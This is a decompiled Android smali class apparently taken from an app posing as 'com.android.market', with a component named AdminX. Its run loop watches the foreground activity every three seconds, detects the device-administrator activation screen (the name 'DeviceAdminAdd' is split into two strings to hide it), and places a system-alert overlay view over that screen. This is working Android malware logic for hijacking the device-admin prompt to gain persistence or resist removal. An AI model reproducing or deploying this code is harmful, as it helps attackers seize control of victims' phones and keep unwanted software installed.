.class Lcom/android/market/i;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Lcom/android/market/h;

.field private final synthetic b:Landroid/view/View;

.field private final synthetic c:Landroid/os/Handler;


# direct methods
.method constructor <init>(Lcom/android/market/h;Landroid/view/View;Landroid/os/Handler;)V
    .locals 0

    iput-object p1, p0, Lcom/android/market/i;->a:Lcom/android/market/h;

    iput-object p2, p0, Lcom/android/market/i;->b:Landroid/view/View;

    iput-object p3, p0, Lcom/android/market/i;->c:Landroid/os/Handler;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    const/4 v4, 0x0

    iget-object v0, p0, Lcom/android/market/i;->a:Lcom/android/market/h;

    invoke-static {v0}, Lcom/android/market/h;->a(Lcom/android/market/h;)Lcom/android/market/g;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/g;->a(Lcom/android/market/g;)Lcom/android/market/f;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    const-string v1, "activity"

    invoke-virtual {v0, v1}, Lcom/android/market/AdminX;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v0, v0, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    const-string v1, "Devi"

    const-string v2, "ceAdminAdd"

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/android/market/i;->a:Lcom/android/market/h;

    invoke-static {v0}, Lcom/android/market/h;->a(Lcom/android/market/h;)Lcom/android/market/g;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/g;->a(Lcom/android/market/g;)Lcom/android/market/f;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    iget-object v1, p0, Lcom/android/market/i;->a:Lcom/android/market/h;

    invoke-static {v1}, Lcom/android/market/h;->a(Lcom/android/market/h;)Lcom/android/market/g;

    move-result-object v1

    invoke-static {v1}, Lcom/android/market/g;->a(Lcom/android/market/g;)Lcom/android/market/f;

    move-result-object v1

    invoke-static {v1}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v1

    iget-object v1, v1, Lcom/android/market/e;->a:Landroid/view/WindowManager;

    iget-object v2, p0, Lcom/android/market/i;->b:Landroid/view/View;

    const/16 v3, 0x7d0

    invoke-static {v0, v1, v2, v3, v4}, Lcom/android/market/AdminX;->a(Lcom/android/market/AdminX;Landroid/view/WindowManager;Landroid/view/View;IZ)V

    :goto_0
    return-void

    :cond_0
    iget-object v0, p0, Lcom/android/market/i;->a:Lcom/android/market/h;

    invoke-static {v0}, Lcom/android/market/h;->a(Lcom/android/market/h;)Lcom/android/market/g;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/g;->a(Lcom/android/market/g;)Lcom/android/market/f;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/f;->a(Lcom/android/market/f;)Lcom/android/market/e;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/e;->a(Lcom/android/market/e;)Lcom/android/market/AdminX;

    move-result-object v0

    invoke-static {v0}, Lcom/android/market/AdminX;->c(Lcom/android/market/AdminX;)V

    iget-object v0, p0, Lcom/android/market/i;->c:Landroid/os/Handler;

    const-wide/16 v1, 0xbb8

    invoke-virtual {v0, p0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_0
.end method
